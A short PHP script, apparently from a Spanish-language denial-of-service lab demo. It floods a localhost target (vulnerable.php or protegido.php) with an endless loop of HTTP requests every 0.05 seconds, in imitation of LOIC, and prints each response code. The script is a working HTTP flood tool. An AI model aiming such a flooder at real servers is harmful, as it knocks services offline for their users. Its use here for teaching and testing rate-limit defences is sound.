<?php
// ataque.php
// Configuración: Elige a quién atacar
// $objetivo = "http://localhost/demo_dos/vulnerable.php";
$objetivo = "http://localhost/demo_dos/protegido.php";

echo "Iniciando ataque HTTP Flood (Simulación LOIC) hacia: $objetivo <br>";
echo "Presiona 'Detener' en tu navegador para parar.<br><br>";

// Desactivar límite de tiempo de ejecución de PHP
set_time_limit(0); 
$contador = 0;

while(true) {
    $contador++;
    
    // Iniciar petición
    $ch = curl_init($objetivo);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Hacemos la petición
    $respuesta = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    echo "Ataque #$contador - Respuesta Servidor: $http_code <br>";
    
    // Forzamos al navegador a mostrar el texto en tiempo real
    flush();
    ob_flush();
    
    // Pequeña pausa para no colgar TU propia PC completamente, 
    // pero suficiente para molestar al servidor
    usleep(50000); // 0.05 segundos
}
?>